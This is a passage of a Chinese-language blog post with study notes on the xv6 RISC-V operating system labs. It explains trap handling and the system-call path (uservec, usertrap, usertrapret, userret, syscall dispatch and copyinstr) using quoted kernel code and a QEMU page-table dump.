class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最后lab得分"><a href="#最后lab得分" class="headerlink" title="最后lab得分"></a>最后lab得分</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Score: 100/100</span><br></pre></td></tr></table></figure>

<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>在xv6操作系统上编程很奇妙也很有意思。</p>
<h3 id="Lab2-system-calls"><a href="#Lab2-system-calls" class="headerlink" title="Lab2: system calls"></a>Lab2: system calls</h3><p>这个实验主要是为了理解系统调用的工作流程，并为xv6增加一些新的系统调用。</p>
<h4 id="book-read-2"><a href="#book-read-2" class="headerlink" title="book-read"></a>book-read</h4><h5 id="trap"><a href="#trap" class="headerlink" title="trap"></a>trap</h5><p>有三种时间导致cpu搁置普通指令的执行，强制将控制权转移给处理该事件的特殊代码上，一种情况是系统调用使用<code>ecall</code>的时候，一种是异常，比如user/kernel指令做了一些非法的事情如除零，第三种是设备中断，这三种情况被统称为<code>trap</code>,xv6内核处理所有的trap.</p>
<h5 id="risc-v陷入机制"><a href="#risc-v陷入机制" class="headerlink" title="risc-v陷入机制"></a>risc-v陷入机制</h5><p>risc-v架构的cpu都有一组控制寄存器，kernel通过向这些寄存器写入内容来使cpu处理trap</p>
<p>下面是重要的寄存器</p>
<blockquote>
<p><code>stvec</code>:内核在这里写入trap处理程序的地址，risc-v跳转到这里处理trap</p>
<p><code>sepc</code>:当发生trap时，risc-v会保存原来<code>pc</code>的信息到<code>sepc</code>,<code>sret</code>(从陷阱返回)指令就会将<code>sepc</code>复制到<code>pc</code>,内核可以写入<code>sepc</code>来控制<code>sret</code>的去向。</p>
<p><code>scause</code>:risc-v在这里防止描述trap原因的数字</p>
<p><code>sscratch</code>:内核在这里放置一个值，这个值在trap处理程序一开始就会派上用场。</p>
<p><code>sstatus</code>:其中的<code>SIE</code>位控制设备中断是否启动，<code>SPP</code>位指示trap是来自user-mode还是kernel-mode,并控制<code>sret</code>返回的模式</p>
</blockquote>
<p>risc-v硬件对所有trap(除了计时器中断)执行以下操作</p>
<blockquote>
<ol>
<li>如果陷阱是设备中断，并且状态<strong>SIE</strong>位被清空，则不执行以下任何操作。</li>
<li>清除<strong>SIE</strong>以禁用中断。</li>
<li>将<code>pc</code>复制到<code>sepc</code>。</li>
<li>将当前模式（用户或管理）保存在状态的<strong>SPP</strong>位中。</li>
<li>设置<code>scause</code>以反映产生陷阱的原因。</li>
<li>将模式设置为管理模式。</li>
<li>将<code>stvec</code>复制到<code>pc</code>。</li>
<li>在新的<code>pc</code>上开始执行。</li>
</ol>
</blockquote>
<p>可见cpu硬件只会执行这些操作，当控制权给到内核的时候，得要内核自己完成对内核页表的切换，对内核栈的切换，然后进入对trap真正处理的函数上，对除了<code>pc</code>以外所有寄存器的保存。</p>
<h5 id="从用户空间陷入"><a href="#从用户空间陷入" class="headerlink" title="从用户空间陷入"></a>从用户空间陷入</h5><p><img src="http://xv6.dgs.zone/tranlate_books/book-riscv-rev1/images/c2/p2.png" alt="img"></p>
<p>总体分为四步调用，<code>uservec</code>,<code>usertrap</code>,<code>usertrapret</code>和<code>userret</code>。</p>
<p><strong>uservec</strong></p>
<p><code>uservec</code>代码处于<code>kernel/trampoline.S</code>中，一猜就是用汇编写的，因为控制单位到了寄存器量级，但是是risc-v捏，看不太懂。如上面所说，kernel-mode得完成那些操作才可以进入对trap真正处理的函数上（<code>usertrap</code>），而这些操作都被放置在<code>uservec</code>中，即刚开始的<code>stvec</code>指向了<code>uservec</code>,但是刚进入kernel-mode的时候<code>satp</code>并没有指向<code>kernel-page</code>,而是在<code>user-page</code>中，要想执行<code>uservec</code>则必须在用户页表中也映射上,在<code>uservec</code>中会切换<code>satp</code>以指向内核页表，所以为了在切换后继续执行指令，<code>uservec</code>必须在内核页表和用户页表中映射相同的地址。</p>
<p>为此xv6专门设置了一个页面放置<code>uservec</code>代码，然后把这个页面映射到内核页表和所有的用户页表中，且虚拟地址全部相同，这个虚拟地址就是上图的<code>trampoline</code>,在user-mode时stvec就指向了<code>trampoline</code>即<code>userevc</code>。</p>
<p>到这里我觉得十分合理，可能x86也是这样干的，当<code>userevc</code>启动的时候，所有的32个寄存器都保存着原来中断代码的值，不能够随意更改，但<code>userevc</code>需要能够使用一些寄存器才能完成他的功能，risc-v的<code>sscratch</code>就发挥了作用，<code>userevc</code>开始的时候通过指令<code>csrrw</code>交换了<code>a0</code>和<code>sscratch</code>的内容，此时<code>a0</code>寄存器的值就被保存了，<code>uservec</code>就可以使用<code>a0</code>寄存器了。</p>
<p>具体该怎么保存所有的寄存器的值，就牵扯到了另一个机制<code>陷阱帧</code>，如上图所示，陷阱帧就是<code>trapframe</code>,该帧有保存用户所有的寄存器的空间。此时<code>satp</code>还是指向了用户页表，所以要使用这个陷阱帧还得把他映射到用户页表中，<code>sscratch</code>就指向了这个陷阱帧，执行完<code>csrrw</code>后<code>a0</code>寄存器就指向了陷阱帧，然后<code>uservec</code>就利用a0把所有用户寄存器保存在陷阱帧，陷阱帧中还包含了指向当前进程内核栈的指针，当前cpu的<code>hartid</code>,<code>usertrap</code>的地址以及内核页表的地址，<code>uservec</code>就取得这些值，将<code>satp</code>切换到内核页表，并调用<code>usertrap</code>。</p>
<p><strong>usertrap</strong></p>
<p>下面是xv6 usertrap代码</p>
<p>代码比较清晰，首先会检查上一个模式是什么，然后设置<code>stvec</code>,因为此时cpu已经处于内核态了，当发生trap时得执行内核的<code>kernelvec</code>而不是<code>suervec</code>,所以会把<code>stvec</code>指向<code>kernelvec</code>,然后保存了sepc到p-&gt;trapframe-&gt;sepc中防止被覆盖，然后判断trap的类型，如果是系统调用<code>syscall()</code>会处理，如果是设备中断，<code>devintr</code>会处理他，否则就是一个异常，就设置<code>p-&gt;killed=1</code>,代表会被杀死，最后内核检查进程是否应该被杀死或者因为时钟中断让出cpu,最后调用<code>usertrapret</code>,流程比起<code>uservec</code>好理解多了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrap</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((r_sstatus() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    syscall();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>usertrapret</strong></p>
<p>首先是获得进程的proc结构体，然后是<code>intr_off</code>设置了sstatus的<code>sie</code>位，然后是设置了<code>stvec</code>，因为要返回用户态了，所以trap处理程序变成了<code>uservec</code>,然后是在陷阱帧中记录内核页表地址，sp地址，<code>usertrap</code>地址，以及<code>hartid</code>。然后是设置sstatus的ssp位，把上一个模式设置为user-mode,然后是设置sepc得到用户态页表地址，然后又跳回<code>trampoline</code>中执行<code>userret</code>,至于为什么要把<code>userret</code>函数放置在<code>trampoline</code>中，是因为<code>userret</code>中会切换页表。要想切换完页表还能继续执行<code>userret</code>只能把他放在<code>trampoline</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrapret</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// we&#x27;re about to switch the destination of traps from</span></span><br><span class="line">  <span class="comment">// kerneltrap() to usertrap(), so turn off interrupts until</span></span><br><span class="line">  <span class="comment">// we&#x27;re back in user space, where usertrap() is correct.</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send syscalls, interrupts, and exceptions to trampoline.S</span></span><br><span class="line">  w_stvec(TRAMPOLINE + (uservec - trampoline));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up trapframe values that uservec will need when</span></span><br><span class="line">  <span class="comment">// the process next re-enters the kernel.</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set S Previous Privilege mode to User.</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// clear SPP to 0 for user mode</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// enable interrupts in user mode</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set S Exception Program Counter to the saved user pc.</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tell trampoline.S the user page table to switch to.</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// jump to trampoline.S at the top of memory, which </span></span><br><span class="line">  <span class="comment">// switches to the user page table, restores user registers,</span></span><br><span class="line">  <span class="comment">// and switches to user mode with sret.</span></span><br><span class="line">  uint64 fn = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(uint64,uint64))fn)(TRAPFRAME, satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>userret</strong></p>
<p>a1保存的是用户态页表地址，a0保存的是<code>trampoline</code>地址，首先切换页表，然后从陷阱帧中恢复用户寄存器，最后调用<code>sret</code>完成对用户态的切换。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">.globl userret</span><br><span class="line">userret:</span><br><span class="line">        # userret(TRAPFRAME, pagetable)</span><br><span class="line">        # switch from kernel to user.</span><br><span class="line">        # usertrapret() calls here.</span><br><span class="line">        # a0: TRAPFRAME, in user page table.</span><br><span class="line">        # a1: user page table, for satp.</span><br><span class="line"></span><br><span class="line">        # switch to the user page table.</span><br><span class="line">        csrw satp, a1</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # put the saved user a0 in sscratch, so we</span><br><span class="line">        # can swap it with our a0 (TRAPFRAME) in the last step.</span><br><span class="line">        ld t0, 112(a0)</span><br><span class="line">        csrw sscratch, t0</span><br><span class="line"></span><br><span class="line">        # restore all but a0 from TRAPFRAME</span><br><span class="line">        ld ra, 40(a0)</span><br><span class="line">        ld sp, 48(a0)</span><br><span class="line">        ld gp, 56(a0)</span><br><span class="line">        ld tp, 64(a0)</span><br><span class="line">        ld t0, 72(a0)</span><br><span class="line">        ld t1, 80(a0)</span><br><span class="line">        ld t2, 88(a0)</span><br><span class="line">        ld s0, 96(a0)</span><br><span class="line">        ld s1, 104(a0)</span><br><span class="line">        ld a1, 120(a0)</span><br><span class="line">        ld a2, 128(a0)</span><br><span class="line">        ld a3, 136(a0)</span><br><span class="line">        ld a4, 144(a0)</span><br><span class="line">        ld a5, 152(a0)</span><br><span class="line">        ld a6, 160(a0)</span><br><span class="line">        ld a7, 168(a0)</span><br><span class="line">        ld s2, 176(a0)</span><br><span class="line">        ld s3, 184(a0)</span><br><span class="line">        ld s4, 192(a0)</span><br><span class="line">        ld s5, 200(a0)</span><br><span class="line">        ld s6, 208(a0)</span><br><span class="line">        ld s7, 216(a0)</span><br><span class="line">        ld s8, 224(a0)</span><br><span class="line">        ld s9, 232(a0)</span><br><span class="line">        ld s10, 240(a0)</span><br><span class="line">        ld s11, 248(a0)</span><br><span class="line">        ld t3, 256(a0)</span><br><span class="line">        ld t4, 264(a0)</span><br><span class="line">        ld t5, 272(a0)</span><br><span class="line">        ld t6, 280(a0)</span><br><span class="line"></span><br><span class="line">	# restore user a0, and save TRAPFRAME in sscratch</span><br><span class="line">        csrrw a0, sscratch, a0</span><br><span class="line">        </span><br><span class="line">        # return to user mode and user pc.</span><br><span class="line">        # usertrapret() set up sstatus and sepc.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p>借助从用户态的陷入终于理清了xv6的用户态和内核态的转换了，受益匪浅。</p>
<p><strong>调用系统调用</strong></p>
<p><code>syscall</code>代码如下，代码简略清晰，就以<code>exec</code>调用位例子，两个参数分别存放在a0,和a1中，然后把系统调用号放在a7中，系统调用号就是<code>syscall[]</code>的下标，寻找到的值就是该系统调用的处理函数，<code>exec</code>系统调用最后就会调用<code>sys_exec</code>。此时会有个疑问，系统调用都是有参数的，为什么最后的<code>p-&gt;trapframe-&gt;a0 = syscalls[num]();</code>没有呢，我大概看了<code>sys_exec</code>的代码，发现他是直接从陷阱帧中取寄存器值的，而不是传参。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="keyword">void</span>)</span> </span>= &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line">[SYS_wait]    sys_wait,</span><br><span class="line">[SYS_pipe]    sys_pipe,</span><br><span class="line">[SYS_read]    sys_read,</span><br><span class="line">[SYS_kill]    sys_kill,</span><br><span class="line">[SYS_exec]    sys_exec,</span><br><span class="line">[SYS_fstat]   sys_fstat,</span><br><span class="line">[SYS_chdir]   sys_chdir,</span><br><span class="line">[SYS_dup]     sys_dup,</span><br><span class="line">[SYS_getpid]  sys_getpid,</span><br><span class="line">[SYS_sbrk]    sys_sbrk,</span><br><span class="line">[SYS_sleep]   sys_sleep,</span><br><span class="line">[SYS_uptime]  sys_uptime,</span><br><span class="line">[SYS_open]    sys_open,</span><br><span class="line">[SYS_write]   sys_write,</span><br><span class="line">[SYS_mknod]   sys_mknod,</span><br><span class="line">[SYS_unlink]  sys_unlink,</span><br><span class="line">[SYS_link]    sys_link,</span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="系统调用参数"><a href="#系统调用参数" class="headerlink" title="系统调用参数"></a>系统调用参数</h5><p>好家伙，我刚有这个疑问，书的下一节就解释这个问题，牛啊。</p>
<p>系统提供三个函数artint,artaddr,artfd从陷阱帧中检索第<code>n</code>个系统调用参数并且以整数，指针，或者文件描述符的形式保存，他们都调用<code>argraw</code>来检索相应的保存的用户寄存器。比如<code>argstr</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">argstr(<span class="keyword">int</span> n, <span class="keyword">char</span> *buf, <span class="keyword">int</span> max)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(n, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> fetchstr(addr, buf, max);</span><br><span class="line">&#125;</span><br><span class="line">argaddr(<span class="keyword">int</span> n, uint64 *ip)</span><br><span class="line">&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内核要想获得一个整数还行，但是要想获得用户态的某一个字符串或者某一段内存的值就不好办了，因为此时处于内核态，页表是内核页表，并不能访问用户态的内存，可以看看xv6是如何完成的。</p>
<p><code>copyinstr</code>函数就是完成在内核态从用户态到内核态拷贝数据的函数，传入的参数有进程的陷阱帧，内核接收地址dst和用户态地址srcva以及拷贝量max。我简述一下原理，就是利用传进来的用户态虚拟地址srcva和进程的陷阱帧完成对这个虚拟地址所映射的物理地址<code>pa0</code>的查询，查询过程就是利用陷阱帧记录的用户态页表，然后通过这个虚拟地址找到对应物理地址返回，在内核态中，由于内核将所有物理RAM地址映射到同一个内核虚拟地址，<code>copyinstr</code>可以直接将字符串字节从<code>pa0</code>复制到<code>dst</code>（这段其实不是很理解，我不确定这个pa0到底是不是物理地址，如果是的话<code>copyinstr</code>直接使用物理地址进行copy<code>*dst = *p</code>,那唯一的解释就是映射是直接映射，即虚拟地址和物理地址是一一对应的才可以）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">copyinstr(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">char</span> *dst, uint64 srcva, uint64 max)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="keyword">int</span> got_null = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(got_null == <span class="number">0</span> &amp;&amp; max &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(srcva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (srcva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; max)</span><br><span class="line">      n = max;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p = (<span class="keyword">char</span> *) (pa0 + (srcva - va0));</span><br><span class="line">    <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(*p == <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        got_null = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *dst = *p;</span><br><span class="line">      &#125;</span><br><span class="line">      --n;</span><br><span class="line">      --max;</span><br><span class="line">      p++;</span><br><span class="line">      dst++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    srcva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(got_null)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过在qemu下打印页表发现似乎就是这样的,映射了个寂寞🤦‍♀️，在linux系统中内核好歹是线性映射所有物理区域，xv6直接一对一了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">vaddr            paddr            size             attr</span><br><span class="line">---------------- ---------------- ---------------- -------</span><br><span class="line">0000000002000000 0000000002000000 0000000000010000 rw-----</span><br><span class="line">000000000c000000 000000000c000000 0000000000001000 rw---ad</span><br><span class="line">000000000c001000 000000000c001000 0000000000001000 rw-----</span><br><span class="line">000000000c002000 000000000c002000 0000000000001000 rw---ad</span><br><span class="line">000000000c003000 000000000c003000 00000000001fe000 rw-----</span><br><span class="line">000000000c201000 000000000c201000 0000000000001000 rw---ad</span><br><span class="line">000000000c202000 000000000c202000 0000000000001000 rw-----</span><br><span class="line">000000000c203000 000000000c203000 0000000000001000 rw---ad</span><br><span class="line">000000000c204000 000000000c204000 0000000000001000 rw-----</span><br><span class="line">000000000c205000 000000000c205000 0000000000001000 rw---ad</span><br><span class="line">000000000c206000 000000000c206000 00000000001fa000 rw-----</span><br><span class="line">0000000010000000 0000000010000000 0000000000002000 rw---ad</span><br><span class="line">0000000080000000 0000000080000000 0000000000007000 r-x--a-</span><br><span class="line">0000000080007000 0000000080007000 0000000000001000 r-x----</span><br><span class="line">0000000080008000 0000000080008000 0000000000005000 